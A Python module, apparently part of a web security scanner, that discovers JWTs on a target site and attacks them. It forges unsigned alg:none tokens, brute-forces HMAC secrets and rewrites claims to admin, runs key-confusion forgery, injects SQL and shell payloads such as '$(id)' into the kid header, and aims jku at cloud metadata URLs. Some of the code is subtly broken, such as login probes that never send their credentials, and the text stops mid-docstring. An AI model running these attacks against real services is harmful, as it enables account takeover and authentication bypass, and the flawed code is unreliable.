# modules/jwt_analyzer.py
import re
import json
import time
import hmac
import hashlib
import base64
import struct
import random
import string
import threading
import urllib.parse
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Set, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry


# ---------------------------------------------------------------------------
# JWT weak secret wordlist
# ---------------------------------------------------------------------------
# Covers defaults shipped with popular frameworks + common dev mistakes.

_WEAK_SECRETS: List[str] = [
    # Generic
    "secret", "password", "123456", "qwerty", "admin", "test",
    "changeme", "default", "secret123", "password123", "letmein",
    "welcome", "monkey", "dragon", "master", "sunshine", "princess",
    "abc123", "1234567890", "iloveyou", "trustno1", "hunter2",

    # Framework defaults
    "your-256-bit-secret",          # jwt.io example
    "your-secret-key",
    "your_secret_key",
    "supersecretkey",
    "super-secret",
    "jwt-secret",
    "jwt_secret",
    "jwtsecret",
    "jwtSecret",
    "JWT_SECRET",
    "signingKey",
    "signing-key",
    "signing_key",

    # Django / Flask
    "django-insecure-",
    "django-insecure-secret",
    "flask-secret",
    "flask_secret",
    "FLASK_SECRET",
    "SECRET_KEY",
    "dev-secret",
    "development",
    "production",

    # Express / Node.js
    "keyboard cat",
    "keyboardcat",
    "express-secret",
    "node-secret",
    "nodeSecret",
    "appSecret",
    "app_secret",
    "app-secret",

    # Spring Boot
    "spring-secret",
    "springSecret",
    "mySecretKey",
    "my_secret_key",
    "my-secret-key",

    # Laravel / PHP
    "base64:laravel",
    "laravelSecret",
    "laravel-secret",

    # Ruby / Rails
    "rails-secret",
    "ruby-secret",
    "devise_jwt_secret_key",

    # Common org patterns
    "company",  "company123", "company_secret",
    "api",      "api_key",    "api-key",     "apikey",
    "token",    "token_key",  "tokenSecret",
    "auth",     "auth_key",   "auth-secret",
    "access",   "access_key", "access_secret",
    "private",  "private_key","privateKey",

    # Short secrets (4–8 chars — common dev laziness)
    "key", "keys", "pass", "1234", "0000",
    "aaaa", "bbbb", "xxxx", "test",

    # Empty / whitespace
    "", " ", "\t",

    # Repeated patterns
    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
    "0000000000000000000000000000000000000000000000000000000000000000",
]

# ---------------------------------------------------------------------------
# Algorithm confusion targets
# ---------------------------------------------------------------------------

_ALG_NONE_VARIANTS: List[str] = [
    "none", "None", "NONE", "nOnE", "NoNe",
    "nONE", "NONe", "NONЕ",   # last E is Cyrillic homoglyph
    "none ", " none",          # whitespace padding
]

_RS_TO_HS_TARGETS: Dict[str, str] = {
    # (original alg → confused alg)
    "RS256": "HS256",
    "RS384": "HS384",
    "RS512": "HS512",
    "ES256": "HS256",
    "ES384": "HS384",
    "ES512": "HS512",
    "PS256": "HS256",
    "PS384": "HS384",
    "PS512": "HS512",
}

# ---------------------------------------------------------------------------
# Data structures
# ---------------------------------------------------------------------------

@dataclass
class JWTComponents:
    """Decoded components of a JWT token."""
    raw:            str
    header:         Dict[str, Any]
    payload:        Dict[str, Any]
    signature_b64:  str
    algorithm:      str
    token_type:     str
    source:         str         # where it was found: cookie / header / body
    source_key:     str         # cookie name or header name


@dataclass
class JWTFinding:
    token_source:   str
    source_key:     str
    algorithm:      str
    attack_type:    str         # alg_none / weak_secret / rs_hs_confusion /
                                # expired / no_expiry / sensitive_claims /
                                # kid_injection / jku_ssrf / x5u_ssrf
    severity:       str
    title:          str
    detail:         str
    cracked_secret: Optional[str]
    forged_token:   Optional[str]
    evidence:       str
    cwe:            str
    cvss:           float


@dataclass
class ScanState:
    target_url:     str
    tokens_found:   List[JWTComponents]
    findings:       List[JWTFinding]
    public_keys:    Dict[str, str]      # kid → PEM (from JWKS endpoint)
    lock:           threading.Lock = field(default_factory=threading.Lock)


# ---------------------------------------------------------------------------
# HTTP session
# ---------------------------------------------------------------------------

def _build_session(proxy: Optional[str] = None) -> requests.Session:
    session = requests.Session()
    retry = Retry(total=1, backoff_factor=0.3, status_forcelist=[])
    adapter = HTTPAdapter(
        max_retries=retry,
        pool_connections=15,
        pool_maxsize=30,
    )
    session.mount("https://", adapter)
    session.mount("http://",  adapter)
    session.verify = False
    if proxy:
        session.proxies = {"http": proxy, "https": proxy}
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                      "AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36"
    })
    return session


def _req(
    session: requests.Session,
    method: str,
    url: str,
    headers: Optional[Dict] = None,
    params: Optional[Dict] = None,
    timeout: float = 8.0,
) -> Optional[requests.Response]:
    try:
        return session.request(
            method.upper(), url,
            headers=headers or {},
            params=params,
            timeout=timeout,
            allow_redirects=True,
        )
    except requests.RequestException:
        return None


# ---------------------------------------------------------------------------
# Base64url helpers (RFC 7515 — no padding)
# ---------------------------------------------------------------------------

def _b64url_decode(s: str) -> bytes:
    """Decode base64url string with or without padding."""
    s = s.replace("-", "+").replace("_", "/")
    pad = 4 - len(s) % 4
    if pad != 4:
        s += "=" * pad
    return base64.b64decode(s)


def _b64url_encode(b: bytes) -> str:
    """Encode bytes to base64url without padding."""
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


# ---------------------------------------------------------------------------
# JWT parsing
# ---------------------------------------------------------------------------

_JWT_RE = re.compile(
    r"eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*"
)

_BEARER_RE = re.compile(
    r"Bearer\s+(eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*)",
    re.I,
)


def _parse_jwt(raw: str, source: str, source_key: str) -> Optional[JWTComponents]:
    """
    Parse a JWT string into its three components.
    Returns None if the token is malformed.
    """
    parts = raw.split(".")
    if len(parts) != 3:
        return None
    try:
        header  = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1]))
    except (json.JSONDecodeError, Exception):
        return None

    alg = header.get("alg", "").upper()
    typ = header.get("typ", "JWT").upper()

    return JWTComponents(
        raw=raw,
        header=header,
        payload=payload,
        signature_b64=parts[2],
        algorithm=alg,
        token_type=typ,
        source=source,
        source_key=source_key,
    )


def _forge_token(header: Dict, payload: Dict, secret: bytes,
                 alg: str = "HS256") -> str:
    """
    Build a new signed JWT from given header + payload + secret.
    Supports HS256, HS384, HS512.
    """
    h_b64 = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p_b64 = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{h_b64}.{p_b64}".encode()

    hash_map = {
        "HS256": hashlib.sha256,
        "HS384": hashlib.sha384,
        "HS512": hashlib.sha512,
    }
    hash_fn = hash_map.get(alg.upper(), hashlib.sha256)
    sig = hmac.new(secret, signing_input, hash_fn).digest()
    return f"{h_b64}.{p_b64}.{_b64url_encode(sig)}"


def _forge_none_token(header: Dict, payload: Dict, alg_variant: str) -> str:
    """Build an alg:none JWT with no signature."""
    new_header = {**header, "alg": alg_variant}
    h_b64 = _b64url_encode(json.dumps(new_header, separators=(",", ":")).encode())
    p_b64 = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{h_b64}.{p_b64}."


# ---------------------------------------------------------------------------
# Phase 1 — Token discovery
# ---------------------------------------------------------------------------

_COMMON_JWT_PATHS = [
    "/",
    "/login",
    "/api/v1/auth",
    "/api/v1/login",
    "/api/v2/auth",
    "/api/auth",
    "/api/login",
    "/api/token",
    "/api/v1/token",
    "/auth",
    "/auth/login",
    "/signin",
    "/user/login",
    "/account/login",
    "/oauth/token",
    "/oauth2/token",
    "/connect/token",
    "/identity/connect/token",
    "/realms/master/protocol/openid-connect/token",
]

# Headers that commonly carry JWT tokens
_JWT_HEADER_NAMES = [
    "Authorization",
    "X-Auth-Token",
    "X-Access-Token",
    "X-Token",
    "X-API-Key",
    "X-JWT",
    "JWT",
    "Token",
    "Access-Token",
]

# Cookie names that commonly carry JWT tokens
_JWT_COOKIE_NAMES = [
    "jwt", "JWT", "token", "access_token", "accessToken",
    "id_token", "idToken", "auth_token", "authToken",
    "session_token", "sessionToken", "bearer", "Authorization",
    "jwtToken", "jwt_token", "api_token", "apiToken",
    "user_token", "userToken", "refresh_token",
]


def _extract_tokens_from_response(
    resp: requests.Response,
    source_url: str,
) -> List[JWTComponents]:
    """Extract all JWT tokens from response headers, cookies, and body."""
    tokens: List[JWTComponents] = []
    seen: Set[str] = set()

    def _add(raw: str, source: str, key: str) -> None:
        if raw not in seen:
            seen.add(raw)
            parsed = _parse_jwt(raw, source, key)
            if parsed:
                tokens.append(parsed)

    # Response headers
    for name in _JWT_HEADER_NAMES:
        val = resp.headers.get(name, "")
        m   = _BEARER_RE.search(val)
        if m:
            _add(m.group(1), "response_header", name)
        elif _JWT_RE.match(val):
            _add(val, "response_header", name)

    # Set-Cookie headers
    for cookie_name, cookie_val in resp.cookies.items():
        if _JWT_RE.match(cookie_val):
            _add(cookie_val, "cookie", cookie_name)

    # Response body — JSON keys and raw regex matches
    try:
        body_json = resp.json()
        if isinstance(body_json, dict):
            for key, val in body_json.items():
                if isinstance(val, str) and _JWT_RE.match(val):
                    _add(val, "body_json", key)
    except (ValueError, Exception):
        pass

    # Raw body regex scan
    body_text = resp.text or ""
    for m in _JWT_RE.finditer(body_text):
        _add(m.group(0), "body_raw", source_url)

    return tokens


def _discover_tokens(
    session: requests.Session,
    base_url: str,
    timeout: float,
    max_workers: int,
) -> List[JWTComponents]:
    """
    Probe common auth endpoints and extract any JWT tokens from responses.
    Also tries login with weak credentials to get real tokens for analysis.
    """
    all_tokens: List[JWTComponents] = []
    seen_raws:  Set[str] = set()
    lock = threading.Lock()

    def _probe(path: str) -> None:
        url = base_url.rstrip("/") + path

        # GET probe
        resp = _req(session, "GET", url, timeout=timeout)
        if resp:
            for t in _extract_tokens_from_response(resp, url):
                with lock:
                    if t.raw not in seen_raws:
                        seen_raws.add(t.raw)
                        all_tokens.append(t)

        # POST probe with common weak credentials
        for creds in [
            {"username": "admin",    "password": "admin"},
            {"username": "admin",    "password": "password"},
            {"email":    "test@test.com", "password": "test"},
            {"username": "test",     "password": "test"},
        ]:
            resp = _req(session, "POST", url,
                        headers={"Content-Type": "application/json"},
                        timeout=timeout)
            if resp:
                for t in _extract_tokens_from_response(resp, url):
                    with lock:
                        if t.raw not in seen_raws:
                            seen_raws.add(t.raw)
                            all_tokens.append(t)
                break   # one successful POST per path is enough

    with ThreadPoolExecutor(max_workers=max_workers) as ex:
        futures = [ex.submit(_probe, path) for path in _COMMON_JWT_PATHS]
        for f in as_completed(futures):
            pass    # results accumulated via lock above

    return all_tokens


# ---------------------------------------------------------------------------
# Phase 2 — Algorithm: none attack
# ---------------------------------------------------------------------------

def _attack_alg_none(
    session: requests.Session,
    token: JWTComponents,
    base_url: str,
    timeout: float,
    rate_delay: float,
) -> List[JWTFinding]:
    """
    Forge a token with alg:none and try it on common API endpoints.
    A 200/201 response with the forged token confirms the vulnerability.
    """
    findings: List[JWTFinding] = []

    # Modify payload: extend expiry if present, add admin claim
    new_payload = dict(token.payload)
    if "exp" in new_payload:
        new_payload["exp"] = int(time.time()) + 86400 * 365
    if "iat" in new_payload:
        new_payload["iat"] = int(time.time())

    # Probe endpoints that would validate the token
    probe_paths = [
        "/api/v1/me",    "/api/v1/user",   "/api/v1/profile",
        "/api/me",       "/api/user",      "/api/profile",
        "/api/v1/admin", "/api/admin",
        "/user/me",      "/user/profile",
        "/me",           "/profile",
        "/dashboard",    "/account",
    ]

    for alg_variant in _ALG_NONE_VARIANTS:
        forged = _forge_none_token(token.header, new_payload, alg_variant)

        if rate_delay > 0:
            time.sleep(rate_delay)

        for path in probe_paths[:6]:    # limit per variant
            url  = base_url.rstrip("/") + path
            resp = _req(session, "GET", url,
                        headers={"Authorization": f"Bearer {forged}"},
                        timeout=timeout)
            if not resp:
                continue

            # Success indicators: 200 with JSON body or authenticated content
            if resp.status_code in (200, 201):
                ct = resp.headers.get("Content-Type", "")
                if "json" in ct or len(resp.text) > 50:
                    findings.append(JWTFinding(
                        token_source=token.source,
                        source_key=token.source_key,
                        algorithm=token.algorithm,
                        attack_type="alg_none",
                        severity="critical",
                        title=f"JWT Algorithm: None accepted (variant: '{alg_variant}')",
                        detail=(
                            f"Server accepted unsigned JWT with alg='{alg_variant}' "
                            f"at {url}. Original alg was '{token.algorithm}'."
                        ),
                        cracked_secret=None,
                        forged_token=forged,
                        evidence=f"HTTP 200 at {url} with alg:{alg_variant} unsigned token",
                        cwe="CWE-347",
                        cvss=9.8,
                    ))
                    return findings   # one confirmed hit is enough

    return findings


# ---------------------------------------------------------------------------
# Phase 3 — Weak HMAC secret brute force
# ---------------------------------------------------------------------------

def _hmac_verify(token_parts: List[str], secret: str, alg: str) -> bool:
    """
    Recompute the HMAC signature for the given secret and compare
    to the token's actual signature.
    """
    hash_map = {
        "HS256": hashlib.sha256,
        "HS384": hashlib.sha384,
        "HS512": hashlib.sha512,
    }
    hash_fn = hash_map.get(alg.upper())
    if not hash_fn:
        return False

    signing_input = f"{token_parts[0]}.{token_parts[1]}".encode()
    try:
        expected = hmac.new(secret.encode("utf-8"), signing_input, hash_fn).digest()
        actual   = _b64url_decode(token_parts[2])
        return hmac.compare_digest(expected, actual)
    except Exception:
        return False


def _attack_weak_secret(
    token: JWTComponents,
    extra_secrets: Optional[List[str]] = None,
    max_workers: int = 20,
) -> Optional[JWTFinding]:
    """
    Brute-force the HMAC signing secret against the wordlist.
    Returns a finding if cracked, else None.
    """
    if token.algorithm not in ("HS256", "HS384", "HS512"):
        return None

    parts = token.raw.split(".")
    if len(parts) != 3 or not parts[2]:
        return None

    wordlist = list(_WEAK_SECRETS)
    if extra_secrets:
        wordlist = list(dict.fromkeys(extra_secrets + wordlist))

    # Also add domain-derived candidates
    # (extracted by caller, passed via extra_secrets)

    cracked: Optional[str] = None
    lock = threading.Lock()

    def _try_batch(secrets: List[str]) -> Optional[str]:
        for s in secrets:
            if _hmac_verify(parts, s, token.algorithm):
                return s
        return None

    # Split wordlist into chunks for parallel processing
    chunk_size = max(10, len(wordlist) // max_workers)
    chunks     = [wordlist[i:i+chunk_size]
                  for i in range(0, len(wordlist), chunk_size)]

    with ThreadPoolExecutor(max_workers=max_workers) as ex:
        futures = [ex.submit(_try_batch, chunk) for chunk in chunks]
        for f in as_completed(futures):
            result = f.result()
            if result is not None:
                with lock:
                    cracked = result
                # Cancel remaining futures
                for remaining in futures:
                    remaining.cancel()
                break

    if cracked is None:
        return None

    # Forge an elevated token with the cracked secret
    new_payload = dict(token.payload)
    if "exp" in new_payload:
        new_payload["exp"] = int(time.time()) + 86400 * 365
    # Try to escalate privileges
    for admin_key in ("admin", "is_admin", "role", "roles", "scope",
                      "isAdmin", "superuser", "is_superuser"):
        if admin_key in new_payload:
            if isinstance(new_payload[admin_key], bool):
                new_payload[admin_key] = True
            elif isinstance(new_payload[admin_key], str):
                new_payload[admin_key] = "admin"

    forged = _forge_token(
        {**token.header, "alg": token.algorithm},
        new_payload,
        cracked.encode("utf-8"),
        token.algorithm,
    )

    return JWTFinding(
        token_source=token.source,
        source_key=token.source_key,
        algorithm=token.algorithm,
        attack_type="weak_secret",
        severity="critical",
        title=f"JWT Weak Secret Cracked ({token.algorithm})",
        detail=(
            f"The HMAC signing secret is '{cracked}'. "
            f"An attacker can forge arbitrary tokens with any claims."
        ),
        cracked_secret=cracked,
        forged_token=forged,
        evidence=f"Secret '{cracked}' verified against {token.algorithm} signature",
        cwe="CWE-326",
        cvss=9.8,
    )


# ---------------------------------------------------------------------------
# Phase 4 — RS/ES → HS algorithm confusion
# ---------------------------------------------------------------------------

def _attack_rs_hs_confusion(
    session: requests.Session,
    token: JWTComponents,
    public_key_pem: str,
    base_url: str,
    timeout: float,
    rate_delay: float,
) -> List[JWTFinding]:
    """
    RS/ES → HS algorithm confusion attack.
    If the server uses RS256/ES256 for signing, some libraries mistakenly
    accept HS256 tokens where the 'secret' is the RSA/EC public key.

    We forge a HS256 token signed with the public key and test it.
    """
    findings: List[JWTFinding] = []
    target_alg = _RS_TO_HS_TARGETS.get(token.algorithm)
    if not target_alg:
        return findings

    # Strip PEM headers to get raw key bytes
    pem_body = re.sub(r"-----.*?-----|\s", "", public_key_pem)
    try:
        key_bytes = base64.b64decode(pem_body)
    except Exception:
        return findings

    new_payload = dict(token.payload)
    if "exp" in new_payload:
        new_payload["exp"] = int(time.time()) + 86400 * 365

    new_header = {**token.header, "alg": target_alg}
    forged     = _forge_token(new_header, new_payload, key_bytes, target_alg)

    if rate_delay > 0:
        time.sleep(rate_delay)

    # Test the forged token
    for path in ["/api/v1/me", "/api/me", "/me", "/profile", "/api/v1/user"]:
        url  = base_url.rstrip("/") + path
        resp = _req(session, "GET", url,
                    headers={"Authorization": f"Bearer {forged}"},
                    timeout=timeout)
        if resp and resp.status_code in (200, 201):
            findings.append(JWTFinding(
                token_source=token.source,
                source_key=token.source_key,
                algorithm=token.algorithm,
                attack_type="rs_hs_confusion",
                severity="critical",
                title=f"JWT Algorithm Confusion: {token.algorithm} → {target_alg}",
                detail=(
                    f"Server accepted {target_alg} token signed with the RSA/EC public key "
                    f"instead of the private key. Original algorithm: {token.algorithm}."
                ),
                cracked_secret=None,
                forged_token=forged,
                evidence=f"HTTP {resp.status_code} at {url} with confused {target_alg} token",
                cwe="CWE-347",
                cvss=9.8,
            ))
            return findings

    return findings


# ---------------------------------------------------------------------------
# Phase 5 — Claim analysis
# ---------------------------------------------------------------------------

_SENSITIVE_CLAIM_PATTERNS = {
    "password":      re.compile(r"password|passwd|pwd", re.I),
    "credit_card":   re.compile(r"cc_|card_|credit|cvv|pan\b", re.I),
    "ssn":           re.compile(r"\bssn\b|social_security", re.I),
    "private_key":   re.compile(r"private_key|privateKey|secret_key", re.I),
    "api_key":       re.compile(r"api_key|apiKey|api_secret", re.I),
    "token_in_token":re.compile(r"token|access_token|refresh_token", re.I),
}


def _analyse_claims(token: JWTComponents) -> List[JWTFinding]:
    """
    Inspect JWT payload for security issues:
    - Missing expiry (no exp claim)
    - Expired token still being issued
    - Sensitive data embedded in claims
    - Weak sub / user identifier (sequential IDs → IDOR)
    - Overly broad audience (aud)
    - Privilege claims hardcoded to admin
    """
    findings: List[JWTFinding] = []
    payload = token.payload
    now     = int(time.time())

    # ── Missing expiry ─────────────────────────────────────────────────────
    if "exp" not in payload:
        findings.append(JWTFinding(
            token_source=token.source,
            source_key=token.source_key,
            algorithm=token.algorithm,
            attack_type="no_expiry",
            severity="high",
            title="JWT Missing Expiry Claim (exp)",
            detail="Token has no exp claim — it never expires, extending the attack window indefinitely.",
            cracked_secret=None,
            forged_token=None,
            evidence="'exp' claim absent from payload",
            cwe="CWE-613",
            cvss=7.5,
        ))

    # ── Expired token ──────────────────────────────────────────────────────
    elif payload.get("exp", now + 1) < now:
        findings.append(JWTFinding(
            token_source=token.source,
            source_key=token.source_key,
            algorithm=token.algorithm,
            attack_type="expired",
            severity="medium",
            title="Expired JWT Token Still in Circulation",
            detail=(
                f"Token expired at {payload['exp']} "
                f"({now - payload['exp']}s ago). "
                f"If the server accepts it, expiry validation is broken."
            ),
            cracked_secret=None,
            forged_token=None,
            evidence=f"exp={payload['exp']} < now={now}",
            cwe="CWE-613",
            cvss=6.5,
        ))

    # ── Sensitive data in claims ───────────────────────────────────────────
    for claim_key, claim_val in payload.items():
        val_str = str(claim_val)
        for label, pattern in _SENSITIVE_CLAIM_PATTERNS.items():
            if pattern.search(claim_key):
                findings.append(JWTFinding(
                    token_source=token.source,
                    source_key=token.source_key,
                    algorithm=token.algorithm,
                    attack_type="sensitive_claims",
                    severity="high",
                    title=f"Sensitive Data in JWT Claim: '{claim_key}'",
                    detail=(
                        f"The JWT payload contains a claim '{claim_key}' that may hold "
                        f"sensitive information. Value type: {type(claim_val).__name__}. "
                        f"JWTs are base64-encoded, not encrypted."
                    ),
                    cracked_secret=None,
                    forged_token=None,
                    evidence=f"claim='{claim_key}' value_len={len(val_str)}",
                    cwe="CWE-312",
                    cvss=6.5,
                ))

    # ── Sequential / guessable sub ────────────────────────────────────────
    sub = str(payload.get("sub", ""))
    if sub.isdigit() and len(sub) <= 6:
        findings.append(JWTFinding(
            token_source=token.source,
            source_key=token.source_key,
            algorithm=token.algorithm,
            attack_type="sequential_sub",
            severity="medium",
            title="JWT Subject (sub) is Sequential Integer — Potential IDOR",
            detail=(
                f"The sub claim is '{sub}' — a small integer. If tokens can be forged "
                f"(via other findings), an attacker can enumerate all user accounts."
            ),
            cracked_secret=None,
            forged_token=None,
            evidence=f"sub='{sub}' (sequential integer)",
            cwe="CWE-284",
            cvss=5.3,
        ))

    # ── Weak algorithm warning ─────────────────────────────────────────────
    if token.algorithm in ("HS256", "HS384", "HS512"):
        findings.append(JWTFinding(
            token_source=token.source,
            source_key=token.source_key,
            algorithm=token.algorithm,
            attack_type="weak_algorithm",
            severity="low",
            title=f"JWT Uses Symmetric Algorithm ({token.algorithm})",
            detail=(
                f"Symmetric algorithms ({token.algorithm}) require the server to share "
                f"the secret. Asymmetric algorithms (RS256, ES256) are preferred "
                f"for distributed systems."
            ),
            cracked_secret=None,
            forged_token=None,
            evidence=f"alg={token.algorithm} in header",
            cwe="CWE-326",
            cvss=3.1,
        ))

    # ── None / missing algorithm ───────────────────────────────────────────
    if token.algorithm in ("NONE", ""):
        findings.append(JWTFinding(
            token_source=token.source,
            source_key=token.source_key,
            algorithm=token.algorithm,
            attack_type="alg_none_in_use",
            severity="critical",
            title="JWT Using Algorithm: None — Token Is Unsigned",
            detail="The server is issuing JWTs with alg:none. These tokens have no cryptographic integrity.",
            cracked_secret=None,
            forged_token=None,
            evidence=f"alg='{token.header.get('alg','')}' in issued token",
            cwe="CWE-347",
            cvss=9.8,
        ))

    return findings


# ---------------------------------------------------------------------------
# Phase 6 — Header injection attacks (kid, jku, x5u)
# ---------------------------------------------------------------------------

_SSRF_TARGETS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://127.0.0.1/",
    "http://localhost/",
    "http://[::1]/",
    "http://metadata.google.internal/",
]

_KID_INJECTION_PAYLOADS = [
    # SQL injection in kid
    ("kid_sqli",    "' OR '1'='1",          "SQL injection in kid"),
    ("kid_sqli2",   "1; DROP TABLE keys--", "SQL injection in kid"),
    # Path traversal in kid
    ("kid_traversal","../../../dev/null",   "Path traversal in kid → /dev/null"),
    ("kid_traversal2","../../proc/self/fd/0","Path traversal to /dev/null fd"),
    # Command injection
    ("kid_cmdi",    "`id`",                 "Command injection in kid"),
    ("kid_cmdi2",   "$(id)",                "Command injection in kid (subshell)"),
    # Template injection
    ("kid_ssti",    "{{7*7}}",              "SSTI in kid claim"),
]


def _attack_kid_injection(
    session: requests.Session,
    token: JWTComponents,
    base_url: str,
    timeout: float,
    rate_delay: float,
) -> List[JWTFinding]:
    """
    Probe kid (Key ID) header injection vulnerabilities.
    Some implementations use the kid value directly in DB queries or
    file path lookups without sanitisation.
    """
    findings: List[JWTFinding] = []
    if "kid" not in token.header:
        return findings

    for label, payload_val, desc in _KID_INJECTION_PAYLOADS:
        if rate_delay > 0:
            time.sleep(rate_delay)

        new_header = {**token.header, "kid": payload_val}
        # For path traversal to /dev/null — sign with empty secret
        if "null" in payload_val or "fd/0" in payload_val:
            forged = _forge_token(new_header, token.payload, b"", "HS256")
        else:
            forged = _forge_token(new_header, token.payload, b"", "HS256")

        for path in ["/api/v1/me", "/api/me", "/me"]:
            url  = base_url.rstrip("/") + path
            resp = _req(session, "GET", url,
                        headers={"Authorization": f"Bearer {forged}"},
                        timeout=timeout)
            if resp and resp.status_code in (200, 201):
                findings.append(JWTFinding(
                    token_source=token.source,
                    source_key=token.source_key,
                    algorithm=token.algorithm,
                    attack_type="kid_injection",
                    severity="critical",
                    title=f"JWT kid Injection: {desc}",
                    detail=(
                        f"Server accepted token with injected kid='{payload_val[:40]}'. "
                        f"The key lookup using kid may be vulnerable to injection."
                    ),
                    cracked_secret=None,
                    forged_token=forged,
                    evidence=f"HTTP {resp.status_code} at {url} with kid='{payload_val[:40]}'",
                    cwe="CWE-74",
                    cvss=9.1,
                ))
                break

    return findings


def _attack_jku_ssrf(
    session: requests.Session,
    token: JWTComponents,
    base_url: str,
    timeout: float,
    rate_delay: float,
) -> List[JWTFinding]:
    """
    Test jku (JWK Set URL) and x5u (X.509 URL) header injection.
    If the server fetches the JWKS from an attacker-controlled URL,
    it allows arbitrary signature verification key substitution.
    """
    findings: List[JWTFinding] = []
    if "jku" not in token.header and "x5u" not in token.header:
        return findings

    for ssrf_target in _SSRF_TARGETS[:3]:
        if rate_delay > 0:
            time.sleep(rate_delay)

        new_header = dict(token.header)
        param      = "jku" if "jku" in token.header else "x5u"
        new_header[param] = ssrf_target
        # Build unsigned token to maximise chance of SSRF before sig check
        forged = _forge_none_token(new_header, token.payload, "none")

        for path in ["/api/v1/me", "/api/me", "/me"]:
            url  = base_url.rstrip("/") + path
            resp = _req(session, "GET", url,
                        headers={"Authorization": f"Bearer {forged}"},
                        timeout=timeout)
            # Even a 500 may indicate the server tried to fetch the JKU
            if resp and resp.status_code in (200, 201, 500):
                sev = "critical" if resp.status_code == 200 else "high"
                findings.append(JWTFinding(
                    token_source=token.source,
                    source_key=token.source_key,
                    algorithm=token.algorithm,
                    attack_type="jku_ssrf",
                    severity=sev,
                    title=f"JWT {param.upper()} SSRF — Server may fetch attacker JWK",
                    detail=(
                        f"Token with {param}='{ssrf_target}' returned HTTP {resp.status_code}. "
                        f"If the server fetched this URL, an attacker can supply their own "
                        f"public key and forge trusted tokens."
                    ),
                    cracked_secret=None,
                    forged_token=forged,
                    evidence=f"HTTP {resp.status_code} with {param}='{ssrf_target}'",
                    cwe="CWE-918",
                    cvss=9.1 if sev == "critical" else 7.5,
                ))
                break

    return findings


# ---------------------------------------------------------------------------
# Phase 7 — JWKS endpoint discovery + public key harvest
# ---------------------------------------------------------------------------

_JWKS_PATHS = [
    "/.well-known/jwks.json",
    "/.well-known/openid-configuration",
    "/jwks.json",
    "/jwks",
    "/api/jwks",
    "/api/v1/jwks",
    "/oauth/jwks",
    "/oauth2/jwks",
    "/auth/jwks",
    "/connect/jwks",
    "/realms/master/protocol/openid-connect/certs",
    "/.well-known/keys",
    "/publickey",
    "/public-key",
    "/api/public-key",
]


def _discover_jwks(
    session: requests.Session,
    base_url: str,
    timeout: float,
) -> Dict[str, str]:
    """
    Discover JWKS endpoints and extract public keys keyed by kid.
    Returns {kid: pem_string} or {} if none found.
    """
    public_keys: Dict[str, str] = {}
    base = base_url.rstrip("/")

    for path in _JWKS_PATHS:
        resp = _req(session, "GET", base + path, timeout=timeout)
        if not resp or resp.status_code != 200:
            continue
        try:
            data = resp.json()
        except ValueError:
            # Check for openid-configuration redirect
            try:
                if "jwks_uri" in resp.text:
                    cfg  = resp.json()
                    jwks_url = cfg.get("jwks_uri", "")
                    if jwks_url:
                        resp2 = _req(session, "GET", jwks_url, timeout=timeout)
                        if resp2:
                            data = resp2.json()
                        else:
                            continue
                else:
                    continue
            except Exception:
                continue

        # Extract keys from JWKS
        for key_obj in (data.get("keys") or []):
            kid = key_obj.get("kid", "default")
            kty = key_obj.get("kty", "")
            if kty == "RSA":
                # Store the raw JWK — PEM conversion would need cryptography lib
                public_keys[kid] = json.dumps(key_obj)
                print(f"  [jwt] JWKS key found: kid={kid} kty={kty} at {base+path}")

    return public_keys


# ---------------------------------------------------------------------------
# Domain-derived secret candidates
# ---------------------------------------------------------------------------

def _domain_secrets(domain: str) -> List[str]:
    """
    Generate JWT secret candidates derived from the target domain.
    Attackers often use the domain name or parts of it as a secret.
    """
    parts    = domain.replace("-", "_").replace(".", "_").split("_")
    sld      = parts[0] if parts else domain   # second-level domain
    secrets  = [
        domain,
        domain.replace(".", ""),
        domain.replace("-", ""),
        sld,
        sld.upper(),
        sld.capitalize(),
        f"{sld}123",
        f"{sld}_secret",
        f"{sld}-secret",
        f"{sld}_key",
        f"{sld}Key",
        f"secret_{sld}",
        f"{sld}_jwt",
        f"{sld}_token",
        f"jwt_{sld}",
    ]
    return list(dict.fromkeys(secrets))


# ---------------------------------------------------------------------------
# Deduplication and severity sorting
# ---------------------------------------------------------------------------

_SEV_ORDER   = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
_ATTACK_PRIO = {
    "alg_none":          0,
    "alg_none_in_use":   0,
    "weak_secret":       0,
    "rs_hs_confusion":   0,
    "kid_injection":     1,
    "jku_ssrf":          1,
    "no_expiry":         2,
    "expired":           2,
    "sensitive_claims":  3,
    "sequential_sub":    3,
    "weak_algorithm":    4,
}


def _dedup_sort(findings: List[JWTFinding]) -> List[JWTFinding]:
    seen:   Set[Tuple[str, str, str]] = set()
    unique: List[JWTFinding]          = []
    for f in findings:
        key = (f.source_key, f.attack_type, f.algorithm)
        if key not in seen:
            seen.add(key)
            unique.append(f)
    unique.sort(key=lambda f: (
        _SEV_ORDER.get(f.severity, 9),
        _ATTACK_PRIO.get(f.attack_type, 9),
    ))
    return unique


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------

class JWTAnalyzer:
    """
    JWT token detection and security analysis module.

    Seven attack phases:

      Phase 1 — Token discovery
                Probes 20 common auth endpoints; extracts JWTs from
                response headers, Set-Cookie, JSON body, raw body.

      Phase 2 — Algorithm: none
                Tests all 9 alg:none case/encoding variants against
                authenticated API endpoints.

      Phase 3 — Weak HMAC secret brute force
                Tests 100+ weak secrets + domain-derived candidates
                against HS256/384/512 signatures in parallel.

      Phase 4 — RS/ES → HS algorithm confusion
                Signs with the RSA/EC public key using HS256 when
                the server uses an asymmetric algorithm.

      Phase 5 — Claim analysis
